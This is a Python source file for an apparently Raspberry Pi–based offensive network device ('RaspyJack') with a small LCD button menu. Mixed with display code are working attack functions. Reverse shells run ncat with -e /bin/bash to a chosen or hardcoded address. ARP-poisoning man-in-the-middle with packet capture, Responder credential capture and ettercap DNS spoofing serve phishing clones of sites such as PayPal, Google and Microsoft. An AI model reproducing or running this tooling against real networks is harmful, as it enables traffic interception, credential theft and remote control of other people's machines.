#!/usr/bin/env python3

import os
import subprocess
import netifaces
from scapy.all import ARP, Ether, srp
from datetime import datetime
import threading, smbus, time, pyudev, serial, struct, json
from subprocess import STDOUT, check_output
from PIL import Image, ImageDraw, ImageFont, ImageColor
import LCD_Config
import LCD_1in44
import RPi.GPIO as GPIO
import socket
import ipaddress
import signal
from functools import partial
import time
import sys
_stop_evt = threading.Event()
screen_lock = threading.Event()

# https://www.waveshare.com/wiki/File:1.44inch-LCD-HAT-Code.7z

def _stats_loop():
    while not _stop_evt.is_set():
        if screen_lock.is_set():          # ← payload actif → on saute le dessin
            time.sleep(0.5)
            continue
        draw.line([(0, 4), (128, 4)], fill="#222", width=10)
        draw.text((0, 0), f"{temp():.0f} °C ", fill="WHITE", font=font)
        status = ""
        if subprocess.call(['pgrep', 'nmap'], stdout=subprocess.DEVNULL) == 0:
            status = "(Scan in progress)"
        elif is_mitm_running():
            status = "(MITM & sniff)"
        elif subprocess.call(['pgrep', 'ettercap'], stdout=subprocess.DEVNULL) == 0:
            status = "(DNSSpoof)"
        if is_responder_running():
            status = "(Responder)"
        draw.text((30, 0), status, fill="WHITE", font=font)
        time.sleep(2)

def _display_loop():
    while not _stop_evt.is_set():
        if not screen_lock.is_set():
            LCD.LCD_ShowImage(image, 0, 0)
        time.sleep(0.1)

def start_background_loops():
    threading.Thread(target=_stats_loop,   daemon=True).start()
    threading.Thread(target=_display_loop, daemon=True).start()

if os.getuid() != 0:
        print("You need a sudo to run this!")
        exit()
print(" ")
print(" ------ RaspyJack Started !!! ------ ")
start_time = time.time()

####### Classes except menu #######
### Global mostly static values ###
class Defaults():
    start_text = [12, 22]
    text_gap = 12

    updown_center = 52
    updown_pos = [15, updown_center, 88]


    imgstart_path = "/root/"

    install_path = "/root/Raspyjack/"
    config_file = install_path + "gui_conf.json"

    payload_path = install_path + "payloads/"
    payload_log  = install_path + "loot/payload.log"


### Color scheme class ###
class template():
    # Color values
    border = "#0e0e6b"
    background = "#000000"
    text = "#9c9ccc"
    selected_text = "#EEEEEE"
    select = "#141494"
    gamepad = select
    gamepad_fill = selected_text

    # Render the border
    def DrawBorder(self):
        draw.line([(127, 12), (127, 127)], fill=self.border, width=5)
        draw.line([(127, 127), (0, 127)], fill=self.border, width=5)
        draw.line([(0, 127), (0, 12)], fill=self.border, width=5)
        draw.line([(0, 12), (128, 12)], fill=self.border, width=5)

    # Render inside of the border
    def DrawMenuBackground(self):
        draw.rectangle((3, 14, 124, 124), fill=self.background)

    # I don't know how to python pass 'class.variable' as reference properly
    def Set(self, index, color):
        if index == 0:
            self.background = color
        elif index == 1:
            self.border = color
            self.DrawBorder()
        elif index == 2:
            self.text = color
        elif index == 3:
            self.selected_text = color
        elif index == 4:
            self.select = color
        elif index == 5:
            self.gamepad = color
        elif index == 6:
            self.gamepad_fill = color

    def Get(self, index):
        if index == 0:
            return self.background
        elif index == 1:
            return self.border
        elif index == 2:
            return self.text
        elif index == 3:
            return self.selected_text
        elif index == 4:
            return self.select
        elif index == 5:
            return self.gamepad
        elif index == 6:
            return self.gamepad_fill

    # Methods for JSON export
    def Dictonary(self):
        x = {
            "BORDER" : self.border,
            "BACKGROUND" : self.background,
            "TEXT" : self.text,
            "SELECTED_TEXT" : self.selected_text,
            "SELECTED_TEXT_BACKGROUND" : self.select,
            "GAMEPAD" : self.gamepad,
            "GAMEPAD_FILL" : self.gamepad_fill
        }
        return x
    def LoadDictonary(self, dic):
        self.Set(1,dic["BORDER"])
        self.background = dic["BACKGROUND"]
        self.text = dic["TEXT"]
        self.selected_text = dic["SELECTED_TEXT"]
        self.select = dic["SELECTED_TEXT_BACKGROUND"]
        self.gamepad = dic["GAMEPAD"]
        self.gamepad_fill = dic["GAMEPAD_FILL"]

####### Simple methods #######
### Get any button press ###
def getButton():
    while 1:
        for item in PINS:
            if GPIO.input(PINS[item]) == 0:
                return item
        time.sleep(0.01)

def temp() -> float:
    with open("/sys/class/thermal/thermal_zone0/temp") as f:
        return int(f.read()) / 1000


def Leave(poweroff: bool = False) -> None:
    _stop_evt.set()
    GPIO.cleanup()
    if poweroff:
        os.system("sync && poweroff")
    print("Bye!")
    sys.exit(0)


def Restart():
    print("Restarting the UI!")
    Dialog("Restarting!", False)
    arg = ["-n","-5",os.sys.executable] + sys.argv
    os.execv(os.popen("whereis nice").read().split(" ")[1], arg)
    Leave()


def safe_kill(*names):
    for name in names:
        subprocess.run(
            ["pkill", "-9", "-x", name],      # -x = nom exact
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL
        )

### Two threaded functions ###
# One for updating status bar and one for refreshing display #
def is_responder_running():
    time.sleep(1)
    ps_command = "ps aux | grep Responder.py | grep -v grep | awk '{print $2}'"
    try:
        output = subprocess.check_output(ps_command, shell=True)
        pid = int(output.strip())
        return True
    except (subprocess.CalledProcessError, ValueError):
        return False

def is_mitm_running():
    time.sleep(1)
    tcpdump_running = subprocess.call(['pgrep', 'tcpdump'], stdout=subprocess.DEVNULL) == 0
    arpspoof_running = subprocess.call(['pgrep', 'arpspoof'], stdout=subprocess.DEVNULL) == 0
    return tcpdump_running or arpspoof_running


def SaveConfig() -> None:
    data = {
        "PINS":   PINS,
        "PATHS":  {"IMAGEBROWSER_START": default.imgstart_path},
        "COLORS": color.Dictonary(),
    }
    print(json.dumps(data, indent=4, sort_keys=True))
    with open(default.config_file, "w") as wf:
        json.dump(data, wf, indent=4, sort_keys=True)
    print("Config has been saved!")



def LoadConfig():
    global PINS
    global default

    if not (os.path.exists(default.config_file) and os.path.isfile(default.config_file)):
        print("Can't find a config file! Creating one at '" + default.config_file + "'...")
        SaveConfig()

    with open(default.config_file, "r") as rf:
        data = json.load(rf)
        default.imgstart_path = data["PATHS"].get("IMAGEBROWSER_START", default.imgstart_path)
        PINS = data.get("PINS", PINS)
        try:
            color.LoadDictonary(data["COLORS"])
        except:
            pass
        GPIO.setmode(GPIO.BCM)
        for item in PINS:
            GPIO.setup(PINS[item], GPIO.IN, pull_up_down=GPIO.PUD_UP)
    print("Config loaded!")

####### Drawing functions #######

### Simple message box ###
# (Text, Wait for confirmation)  #
def Dialog(a, wait=True):
    draw.rectangle([7, 35, 120, 95], fill="#ADADAD")
    draw.text((35 - len(a), 45), a, fill="#000000")
    draw.rectangle([45, 65, 70, 80], fill="#FF0000")

    draw.text((50, 68), "OK", fill=color.selected_text)
    if wait:
        time.sleep(0.25)
        getButton()

def Dialog_info(a, wait=True):
    draw.rectangle([3, 14, 124, 124], fill="#00A321")
    draw.text((35 - len(a), 45), a, fill="#000000")

### Yes or no dialog ###
# (b is second text line)
def YNDialog(a="Are you sure?", y="Yes", n="No",b=""):
    draw.rectangle([7, 35, 120, 95], fill="#ADADAD")
    draw.text((35 - len(a), 40), a, fill="#000000")
    draw.text((12, 52), b, fill="#000000")
    time.sleep(0.25)
    answer = False
    while 1:
        render_color = "#000000"
        render_bg_color = "#ADADAD"
        if answer:
            render_bg_color = "#FF0000"
            render_color = color.selected_text
        draw.rectangle([15, 65, 45, 80], fill=render_bg_color)
        draw.text((20, 68), y, fill=render_color)

        render_color = "#000000"
        render_bg_color = "#ADADAD"
        if not answer:
            render_bg_color = "#FF0000"
            render_color = color.selected_text
        draw.rectangle([76, 65, 106, 80], fill=render_bg_color)
        draw.text((86, 68), n, fill=render_color)

        button = getButton()
        if button == "KEY_LEFT_PIN" or button == "KEY1_PIN":
            answer = True
        elif button == "KEY_RIGHT_PIN" or button == "KEY3_PIN":
            answer = False
        elif button == "KEY2_PIN" or button == "KEY_PRESS_PIN":
            return answer

### Scroll through text pictures ###
# 8 lines of text on screen at once
# No selection just scrolling through info
def GetMenuPic(a):
    # a=[ [row,2,3,4,5,6,7,8] <- slide, [1,2,3,4,5,6,7,8] ]
    slide=0
    while 1:
        arr=a[slide]
        color.DrawMenuBackground()
        for i in range(0, len(arr)):
            render_text = arr[i]
            render_color = color.text
            draw.text((default.start_text[0], default.start_text[1] + default.text_gap * i),
                      render_text[:m.max_len], fill=render_color)
        time.sleep(0.1)
        button = getButton()
        if button == "KEY_UP_PIN":
            slide = slide-1
            if slide < 0:
                slide = len(a)-1
        elif button == "KEY_DOWN_PIN":
            slide = slide+1
            if slide >= len(a):
                slide = 0
        elif button == "KEY_PRESS_PIN" or button == "KEY_RIGHT_PIN":
            return slide
        elif button == "KEY_LEFT_PIN":
            return -1

### Render first lines of array ###
# Kinda useless but whatever
def ShowLines(arr,bold=[]):
    color.DrawMenuBackground()
    arr = arr[-8:]
    for i in range(0, len(arr)):
        render_text = arr[i]
        render_color = color.text
        if i in bold:
            render_text = m.char + render_text
            render_color = color.selected_text
            draw.rectangle([(default.start_text[0]-5, default.start_text[1] + default.text_gap * i),
                            (120, default.start_text[1] + default.text_gap * i + 10)], fill=color.select)
        draw.text((default.start_text[0], default.start_text[1] + default.text_gap * i),
                    render_text[:m.max_len], fill=render_color)

def GetMenuString(inlist, duplicates=False):
    """
    Affiche une liste déroulante de taille variable dans une fenêtre de 8 lignes.
    - Défilement fluide (on fait glisser la fenêtre d'un item à la fois).
    - Navigation circulaire.
    - Si duplicates=True : retourne (index, valeur) ; sinon retourne valeur.
    - Si la liste est vide : affiche un placeholder et retourne "".
    """
    WINDOW      = 8                 # lignes visibles simultanément
    CURSOR_MARK = m.char            # '> '
    empty       = False

    if not inlist:
        inlist, empty = ["Nothing here :(   "], True

    if duplicates:
        inlist = [f"{i}#{txt}" for i, txt in enumerate(inlist)]

    total   = len(inlist)           # nb total d'items
    index   = 0                     # position réelle du curseur (0-based)
    offset  = 0                     # index du 1er item visible (0-based)

    while True:
        # -- 1/ Recalcule la fenêtre pour que index soit toujours dedans -----
        if index < offset:
            offset = index
        elif index >= offset + WINDOW:
            offset = index - WINDOW + 1

        # -- 2/ Compose la fenêtre à afficher (pas de wrap visuel) ----------
        window = inlist[offset:offset + WINDOW]

        # -- 3/ Rendu --------------------------------------------------------
        color.DrawMenuBackground()
        for i, raw in enumerate(window):
            txt = raw if not duplicates else raw.split('#', 1)[1]
            line = CURSOR_MARK + txt if i == (index - offset) else txt
            fill = color.selected_text if i == (index - offset) else color.text
            # zone de surbrillance
            if i == (index - offset):
                draw.rectangle(
                    (default.start_text[0] - 5,
                     default.start_text[1] + default.text_gap * i,
                     120,
                     default.start_text[1] + default.text_gap * i + 10),
                    fill=color.select
                )
            draw.text(
                (default.start_text[0],
                 default.start_text[1] + default.text_gap * i),
                line[:m.max_len],
                fill=fill
            )
        time.sleep(0.12)

        # -- 4/ Lecture des boutons -----------------------------------------
        btn = getButton()

        if btn == "KEY_DOWN_PIN":
            index = (index + 1) % total      # wrap vers le début
        elif btn == "KEY_UP_PIN":
            index = (index - 1) % total      # wrap vers la fin
        elif btn in ("KEY_PRESS_PIN", "KEY_RIGHT_PIN"):
            raw = inlist[index]
            if empty:
                return (-2, "") if duplicates else ""
            if duplicates:
                idx, txt = raw.split('#', 1)
                return int(idx), txt
            return raw
        elif btn == "KEY_LEFT_PIN":
            return (-1, "") if duplicates else ""



### Draw up down triangles ###
color = template()
def DrawUpDown(value, offset=0, up=False,down=False, render_color=color.text):
    draw.polygon([(offset, 53), (10 + offset, 35), (20+offset, 53)],
        outline=color.gamepad, fill=(color.background, color.gamepad_fill)[up])
    draw.polygon([(10+offset, 93), (20+offset, 75), (offset, 75)],
        outline=color.gamepad, fill=(color.background, color.gamepad_fill)[down])

    draw.rectangle([( offset + 2, 60),(offset+30, 70)], fill=color.background)
    draw.text((offset + 2, 60), str(value) , fill=render_color)


### Screen for selecting RGB color ###
def GetColor(final_color="#000000"):
    color.DrawMenuBackground()
    time.sleep(0.4)
    i_rgb = 0
    render_offset = default.updown_pos
    desired_color = list(int(final_color[i:i+2], 16) for i in (1, 3, 5))

    while GPIO.input(PINS["KEY_PRESS_PIN"]):
        render_up = False
        render_down = False
        final_color='#%02x%02x%02x' % (desired_color[0],desired_color[1],desired_color[2])

        draw.rectangle([(default.start_text[0]-5, 1+ default.start_text[1] + default.text_gap * 0),(120, default.start_text[1] + default.text_gap * 0 + 10)], fill=final_color)
        draw.rectangle([(default.start_text[0]-5, 3+ default.start_text[1] + default.text_gap * 6),(120, default.start_text[1] + default.text_gap * 6 + 12)], fill=final_color)

        DrawUpDown(desired_color[0],render_offset[0],render_up,render_down,(color.text, color.selected_text)[i_rgb == 0])
        DrawUpDown(desired_color[1],render_offset[1],render_up,render_down,(color.text, color.selected_text)[i_rgb == 1])
        DrawUpDown(desired_color[2],render_offset[2],render_up,render_down,(color.text, color.selected_text)[i_rgb == 2])

        button = getButton()
        if button == "KEY_LEFT_PIN":
            i_rgb = i_rgb - 1
            time.sleep(0.1)
        elif button == "KEY_RIGHT_PIN":
            i_rgb = i_rgb + 1
            time.sleep(0.1)
        elif button == "KEY_UP_PIN":
            desired_color[i_rgb] = desired_color[i_rgb] + 5
            render_up = True
        elif button == "KEY_DOWN_PIN":
            desired_color[i_rgb] = desired_color[i_rgb] - 5
            render_down = True
        elif button == "KEY1_PIN":
            desired_color[i_rgb] = desired_color[i_rgb] + 1
            render_up = True
        elif button == "KEY3_PIN":
            desired_color[i_rgb] = desired_color[i_rgb] - 1
            render_down = True
        elif button == "KEY_PRESS_PIN":
            break

        if i_rgb > 2:
            i_rgb = 0
        elif i_rgb < 0:
            i_rgb = 2

        if desired_color[i_rgb] > 255:
            desired_color[i_rgb] = 0
        elif desired_color[i_rgb] < 0:
            desired_color[i_rgb] = 255

        DrawUpDown(desired_color[i_rgb],render_offset[i_rgb],render_up,render_down,color.selected_text)
        time.sleep(0.1)
    return final_color

### Set color based on indexes (not reference pls help)###
def SetColor(a):
    m.which = m.which + "1"
    c = GetColor(color.Get(a))
    if YNDialog(a="Set color to?", y="Yes", n="No",b=("    " + c) ):
        color.Set(a, c)
        Dialog("   Done!")
    m.which = m.which[:-1]

### Select a single value###
def GetIpValue(prefix):
    value = 1
    render_offset = default.updown_pos
    color.DrawMenuBackground()
    time.sleep(0.4)
    while GPIO.input(PINS["KEY_PRESS_PIN"]):
        render_up = False
        render_down = False

        draw.rectangle([(default.start_text[0]-5, 1+ default.start_text[1] + default.text_gap * 0),(120, default.start_text[1] + default.text_gap * 5)], fill=color.background)
        DrawUpDown(value,render_offset[2],render_up,render_down,color.selected_text)
        draw.text(( 5,60), f"IP:{prefix}.", fill=color.selected_text)

        button = getButton()
        if button == "KEY_UP_PIN":
            value = min(255, value + 1)
            render_up = True
        elif button == "KEY_DOWN_PIN":
            value = max(0, value - 1)
            render_down = True
        elif button == "KEY1_PIN":
            value = min(255, value + 5)
            render_up = True
        elif button == "KEY3_PIN":
            value = max(0, value - 5)
            render_down = True
        elif button == "KEY_PRESS_PIN":
            break

        DrawUpDown(value,render_offset[2],render_up,render_down,color.selected_text)
        time.sleep(0.1)
    return value



### Gamepad ###
def Gamepad():
    color.DrawMenuBackground()
    time.sleep(0.5)
    draw.rectangle((25, 55, 45, 73), outline=color.gamepad,
                   fill=color.background)
    draw.text((28, 59), "<<<", fill=color.gamepad)
    m.which = m.which + "1"
    # Don't render if you dont need to => less flickering
    lastimg = [0, 0, 0, 0, 0, 0, 0]
    while GPIO.input(PINS["KEY_PRESS_PIN"]):
        write = ""
        x = 0
        ######
        render_color = color.background
        i = GPIO.input(PINS["KEY_UP_PIN"])
        if i == 0:
            render_color = color.gamepad_fill
            write = write + " UP"
        if i != lastimg[x] or i == 0:
            draw.polygon([(25, 53), (35, 35), (45, 53)],
                         outline=color.gamepad, fill=render_color)
        lastimg[x] = i
        x += 1
        ######
        render_color = color.background
        i = GPIO.input(PINS["KEY_LEFT_PIN"])
        if i == 0:
            render_color = color.gamepad_fill
            write = write + " LEFT"
        if i != lastimg[x] or i == 0:
            draw.polygon([(5, 63), (23, 54), (23, 74)],
                         outline=color.gamepad, fill=render_color)
        lastimg[x] = i
        x += 1
        ######
        render_color = color.background
        i = GPIO.input(PINS["KEY_RIGHT_PIN"])
        if i == 0:
            render_color = color.gamepad_fill
            write = write + " RIGHT"
        if i != lastimg[x] or i == 0:
            draw.polygon([(65, 63), (47, 54), (47, 74)],
                         outline=color.gamepad, fill=render_color)
        lastimg[x] = i
        x += 1
        ######
        render_color = color.background
        i = GPIO.input(PINS["KEY_DOWN_PIN"])
        if i == 0:
            render_color = color.gamepad_fill
            write = write + " DOWN"
        if i != lastimg[x] or i == 0:
            draw.polygon([(35, 93), (45, 75), (25, 75)],
                         outline=color.gamepad, fill=render_color)
        lastimg[x] = i
        x += 1
        ######
        render_color = color.background
        i = GPIO.input(PINS["KEY1_PIN"])
        if i == 0:
            render_color = color.gamepad_fill
            write = write + " Q"
        if i != lastimg[x] or i == 0:
            draw.ellipse((70, 33, 90, 53), outline=color.gamepad,
                         fill=render_color)
        lastimg[x] = i
        x += 1
        ######
        render_color = color.background
        i = GPIO.input(PINS["KEY2_PIN"])
        if i == 0:
            render_color = color.gamepad_fill
            write = write + " E"
        if i != lastimg[x] or i == 0:
            draw.ellipse((100, 53, 120, 73),
                         outline=color.gamepad, fill=render_color)
        lastimg[x] = i
        x += 1
        ######
        render_color = color.background
        i = GPIO.input(PINS["KEY3_PIN"])
        if i == 0:
            render_color = color.gamepad_fill
            write = write + " R"
        if i != lastimg[x] or i == 0:
            draw.ellipse((70, 73, 90, 93), outline=color.gamepad,
                         fill=render_color)
        lastimg[x] = i

        if write != "":
            render_chars = ""
            for item in write[1:].split(" "):
                render_chars += "press(\"" + item + "\");"
            print(os.popen("P4wnP1_cli hid job -t 5 -c '" + render_chars + "'").read())
            time.sleep(0.25)
    m.which = m.which[:-1]
    time.sleep(0.25)

### Basic info screen ###
def ShowInfo():
    color.DrawMenuBackground()
    m.which = m.which + "1"
    last = []  # Used to get rid of the flicker
    while 1:
        try:
# Retrieve configuration information for eth0
            eth0_config = netifaces.ifaddresses("eth0")
            eth0_ipv4 = eth0_config[netifaces.AF_INET][0]['addr']
            eth0_subnet_mask = eth0_config[netifaces.AF_INET][0]['netmask']
            eth0_gateway = netifaces.gateways()["default"][netifaces.AF_INET][0]
            output = subprocess.check_output("ip addr show dev eth0 | awk '/inet / { print $2 }'", shell=True)
            address = output.decode().strip().split('\\')[0]

            if eth0_ipv4:
# The cable is connected, display configuration information
                render_array = ["IP:",
                                eth0_ipv4,
                                "Subnet:",
                                eth0_subnet_mask,
                                "Gateway:",
                                eth0_gateway,
                                "Attack:",
                                 address,]
            else:
# The cable is not connected
                render_array = ["Cable disconnected"]
        except (KeyError, IndexError, ValueError, OSError):
            # Gestion des exceptions
            render_array = ["                 ",
                            "-----------------",
                            "Cable disconnected",
                            "        or       ",
                            "  DHCP problem  ",
                            "-----------------",
                            "                 ",
                            "                 ",]
        if last != render_array:
            for i in range(len(render_array)):
                draw.rectangle([(default.start_text[0]-5, default.start_text[1] + default.text_gap * i),
                                (120, default.start_text[1] + default.text_gap * i + 10)], fill=color.background)
                draw.text((default.start_text[0], default.start_text[1] + default.text_gap * i),
                          render_array[i][:m.max_len], fill=color.text)
            last = render_array
        time.sleep(0.2)
        if GPIO.input(PINS["KEY2_PIN"]) == 0 or GPIO.input(PINS["KEY_LEFT_PIN"]) == 0:
            m.which = m.which[:-1]
            return


def Explorer(path="/",extensions=""):
    # ".gif\|.png\|.bmp\|.jpg\|.tiff\|.jpeg"
    while 1:
        arr = ["../"] + os.popen("ls --format=single-column -F " + path + (" | grep \"" + extensions + "\|/\"","")[extensions==""] ).read().replace("*","").split("\n")[:-1]
        output = GetMenuString(arr,False)
        if output != "":
            if output == "../":
                if path == "/":
                    break
                else:
                    path = (path,path[:-1])[path[-1] == "/"]
                    path = path[:path.rindex("/")]
                    if path == "":
                        path = "/"
                    else:
                        path = (path + "/",path)[path[-1] == "/"]
            elif output[-1] == "/":
                path = (path + "/",path)[path[-1] == "/"]
                path = path + output
                path = (path + "/",path)[path[-1] == "/"]
            else:
                if YNDialog("Open?","Yes","No",output[:10]):
                    return path + output
        else:
            break
    return ""

def ReadTextFileNmap():
    while 1:
        rfile = Explorer("/root/Raspyjack/loot/Nmap/",extensions=".txt\|.json\|.conf\|.pcap")
        if rfile == "":
            break
        with open(rfile) as f:
            content = f.read().splitlines()
        GetMenuString(content)

def ReadTextFileResponder():
    while 1:
        rfile = Explorer("/root/Raspyjack/Responder/logs/",extensions=".log\|.txt\|.pcap")
        if rfile == "":
            break
        with open(rfile) as f:
            content = f.read().splitlines()
        GetMenuString(content)

def ReadTextFileDNSSpoof():
    while 1:
        rfile = Explorer("/root/Raspyjack/DNSSpoof/captures/",extensions=".log\|.txt\|.pcap")
        if rfile == "":
            break
        with open(rfile) as f:
            content = f.read().splitlines()
        GetMenuString(content)

def ImageExplorer() -> None:
    m.which += "1"
    path = default.imgstart_path
    while True:
        arr = ["./"] + os.popen(
            f'ls --format=single-column -F "{path}" | '
            'grep ".gif\\|.png\\|.bmp\\|.jpg\\|.tiff\\|.jpeg\\|/"'
        ).read().replace("*", "").split("\n")[:-1]

        output = GetMenuString(arr, False)
        if not output:
            break

        # ───── navigation ─────
        if output == "./":                       # remonter
            if path == "/":
                break
            path = path.rstrip("/")
            path = path[:path.rindex("/")] or "/"
            if not path.endswith("/"):
                path += "/"
        elif output.endswith("/"):               # entrer dans un dossier
            if not path.endswith("/"):
                path += "/"
            path += output
            if not path.endswith("/"):
                path += "/"
        else:                                    # prévisualiser un fichier image
            if YNDialog("Open?", "Yes", "No", output[:10]):
                full_img = os.path.join(path, output)
                with Image.open(full_img) as img:
                    image.paste(img.resize((128, 128)))
                time.sleep(1)
                getButton()
                color.DrawBorder()
    m.which = m.which[:-1]





WAIT_TXT = "Scan in progess..."
def run_scan(label: str, nmap_args: list[str]):
    Dialog_info(f"      {label}\n        Running\n      wait please...", wait=True)

    ip_with_mask = subprocess.check_output("ip -4 addr show eth0 | awk '/inet / { print $2 }'",shell=True).decode().strip()

    ts   = datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
    path = f"/root/Raspyjack/loot/Nmap/{label.lower().replace(' ', '_')}_{ts}.txt"

    subprocess.run(["nmap", *nmap_args, "-oN", path, ip_with_mask])
    subprocess.run(["sed", "-i", "s/Nmap scan report for //g", path])

    Dialog_info(f"      {label}\n      Finished !!!", wait=True)
    time.sleep(2)


# ---------- main table Nmap arguments -----------------
SCANS = {
    "Quick Scan"            : ["-T5"],
    "Full Port Scan"        : ["-p-"],
    "Service Scan"          : ["-T5", "-sV"],
    "Vulnerability"         : ["-T5", "-sV", "--script", "vuln"],
    "Full Vulns"            : ["-p-", "-sV", "--script", "vuln"],
    "OS Scan"               : ["-T5", "-A"],
    "Intensive Scan"        : ["-O", "-p-", "--script", "vuln"],
    "Stealth SYN Scan"      : ["-sS", "-T4"],                        # Half-open scan, avoids full TCP handshake
    "UDP Scan"              : ["-sU", "-T4"],                        # Finds services that only speak UDP
    "Ping Sweep"            : ["-sn"],                               # Host discovery without port scanning
    "Top100 Scan"           : ["--top-ports", "100", "-T4"],         # Quick look at the most common ports
    "HTTP Enumeration"      : ["-p", "80,81,443,8080,8443", "-sV", "--script", "http-enum,http-title"],  # Fast web-focused recon
}


globals().update({
    f"scan_{k.lower().replace(' ', '_')}": partial(run_scan, k, v)
    for k, v in SCANS.items()
})



def defaut_Reverse():
    default_ip_bytes = subprocess.check_output("ip addr show dev eth0 | awk '/inet / { print $2 }'|cut -d'.' -f1-3", shell=True)
    default_ip = default_ip_bytes.decode('utf-8').strip()
    default_ip_parts = default_ip.split(".")
    default_ip_prefix = ".".join(default_ip_parts[:3])
    new_value = GetIpValue(default_ip_prefix)
    target_ip = f"{default_ip_prefix}.{new_value}"
    nc_command = ['ncat', target_ip, '4444', '-e', '/bin/bash']
    print("Reverse launched on " + target_ip + " !!!!!")
    process = subprocess.Popen(nc_command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, close_fds=True)
    Dialog_info("   Reverse launched !\n   on "+ target_ip , wait=True)
    time.sleep(2)

def remote_Reverse():
    nc_command = ['ncat','192.168.1.30','4444', '-e', '/bin/bash']
    process = subprocess.Popen(nc_command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, close_fds=True)
    reverse_status = "(!!Remote launched!!)"
    draw.text((30, 0), reverse_status, fill="WHITE", font=font)

def responder_on():
    check_responder_command = "ps aux | grep Responder | grep -v grep | cut -d ' ' -f7"
    check_responder_process = os.popen(check_responder_command).read().strip()
    if check_responder_process:
        subprocess.check_call(check_responder_command, shell=True)
        Dialog_info(" Already running !!!!", wait=True)
        time.sleep(2)
    else:
        os.system('python3 /root/Raspyjack/Responder/Responder.py -Q -I eth0 &')
        Dialog_info("     Responder \n      started !!", wait=True)
        time.sleep(2)

def responder_off():
    os.system("killResponder=$(ps aux | grep Responder|grep -v 'grep'|awk '{print $2}')&&kill -9 $killResponder")
    Dialog_info("   Responder \n     stopped !!", wait=True)
    time.sleep(2)


def get_default_gateway_ip():
    gateways = netifaces.gateways()
    return gateways['default'][netifaces.AF_INET][0]

def get_local_network():
    default_gateway_ip = get_default_gateway_ip()
    ip_parts = default_gateway_ip.split('.')
    ip_parts[-1] = '0'
    return '.'.join(ip_parts) + '/24'

def Start_MITM():
    safe_kill("arpspoof", "tcpdump")
    Dialog_info("                    Lancement\n                  MITM & Sniff\n                   En cours\n                  Patientez...", wait=True)
    local_network = get_local_network()
    print(f"[*] Starting MITM attack on local network {local_network}...")

# Scan hosts on the network
    print("[*] Scanning hosts on network...")
    cmd = f"arp-scan --localnet --quiet|grep -v 'Interface\|Starting\|packets\|Ending'"
    result = os.popen(cmd).readlines()

# Display IP and MAC addresses of hosts
    hosts = []
    for line in result:
        parts = line.split()
        if len(parts) == 2:
            hosts.append({'ip': parts[0], 'mac': parts[1]})
            print(f"[+] Host: {parts[0]} ({parts[1]})")


# Retrieve the gateway IP address
    gateway_ip = get_default_gateway_ip()
    print(f"[*] Default gateway IP: {gateway_ip}")

# If at least one host is found, launch the ARP MITM attack
    if len(hosts) > 1:
        print("[*] Launching ARP poisoning attack...")
        for host in hosts:
            if host['ip'] != gateway_ip:
                subprocess.Popen(["arpspoof", "-i", "eth0", "-t", gateway_ip, host['ip']])
                subprocess.Popen(["arpspoof", "-i", "eth0", "-t", host['ip'], gateway_ip])
        print("[*] ARP poisoning attack complete.")

# Start tcpdump capture to sniff network traffic
        now = datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
        pcap_file = f"/root/Raspyjack/loot/MITM/network_traffic_{now}.pcap"
        print(f"[*] Starting tcpdump capture and writing packets to {pcap_file}...")
        os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
        tcpdump_process = subprocess.Popen(["tcpdump", "-i", "eth0", "-w", pcap_file], stdout=subprocess.PIPE)
        tcpdump_process.stdout.close()
        Dialog_info(f" MITM & Sniff\n Sur {len(hosts)-1} hosts !!!", wait=True)
        time.sleep(8)
    else:
        print("[-] No hosts found on network.")
        Dialog_info("  ERREUR\nAucun hote.. ", wait=True)
        time.sleep(2)

def Stop_MITM():
    safe_kill("arpspoof", "tcpdump")
    os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")
    time.sleep(2)
    responder_status = "(!! MITM stopped !!)"
    draw.text((30, 0), responder_status, fill="WHITE", font=font)
    Dialog_info("    MITM & Sniff\n     stopped !!!", wait=True)
    time.sleep(2)


# Name of the currently spoofed site (used elsewhere in your code)
site_spoof = "wordpress"

def spoof_site(name: str):
    global site_spoof
    site_spoof = name

    Dialog_info(f"    Spoofing sur\n    {name} !!!", wait=True)
    time.sleep(2)

    subprocess.run("pkill -f 'php'", shell=True)   # stoppe les instances PHP
    time.sleep(1)

    webroot = f"/root/Raspyjack/DNSSpoof/sites/{name}"
    cmd = f"cd {webroot} && php -S 0.0.0.0:80"
    subprocess.Popen(cmd, shell=True)              # launch the built-in PHP

# Central list of sites to spoof: add/remove freely here
SITES = [
    "microsoft", "wordpress", "instagram", "google", "amazon", "apple",
    "twitter", "netflix", "spotify", "paypal", "linkedin", "snapchat",
    "pinterest", "yahoo", "steam", "adobe", "badoo", "icloud",
    "instafollowers", "ldlc", "origin", "playstation", "protonmail",
    "shopping", "wifi", "yandex",
]

site_spoof = "wordpress"
# Chemin du fichier etter.dns
ettercap_dns_file = "/etc/ettercap/etter.dns"


def Start_DNSSpoofing():
    # Obtenir automatiquement l'adresse IP de la passerelle
    gateway_ip = subprocess.check_output("ip route | awk '/default/ {print $3}'", shell=True).decode().strip()
    current_ip = subprocess.check_output("ip -4 addr show eth0 | awk '/inet / {split($2, a, \"/\"); print a[1]}'", shell=True).decode().strip()

# Escape special characters in the IP address for the sed command
    escaped_ip = current_ip.replace(".", r"\.")

    # Utiliser sed pour modifier les adresses IP dans le fichier etter.dns
    sed_command = f"sed -i 's/[0-9]\+\.[0-9]\+\.[0-9]\+\.[0-9]\+/{escaped_ip}/g' {ettercap_dns_file}"
    subprocess.run(sed_command, shell=True)

    print("------------------------------- ")
    print(f"Site : {site_spoof}")
    print("------------------------------- ")
    print("dns domain spoofed : ")
    dnsspoof_command = f"cat {ettercap_dns_file} | grep -v '#'"
    subprocess.run(dnsspoof_command, shell=True)
    print("------------------------------- ")

# Commands executed in the background
    website_command = f"cd /root/Raspyjack/DNSSpoof/sites/{site_spoof} && php -S 0.0.0.0:80"
    ettercap_command = "ettercap -Tq -M arp:remote -P dns_spoof"
    Dialog_info(f"    DNS Spoofing\n   {site_spoof}  started !!!", wait=True)
    time.sleep(2)

# Execution of background commands
    website_process = subprocess.Popen(website_command, shell=True)
    ettercap_process = subprocess.Popen(ettercap_command, shell=True)


def Stop_DNSSpoofing():
    # Terminer les processus website et ettercap
    subprocess.run("pkill -f 'php'", shell=True)
    subprocess.run("pkill -f 'ettercap'", shell=True)

    Dialog_info("    DNS Spoofing\n     stopped !!!", wait=True)
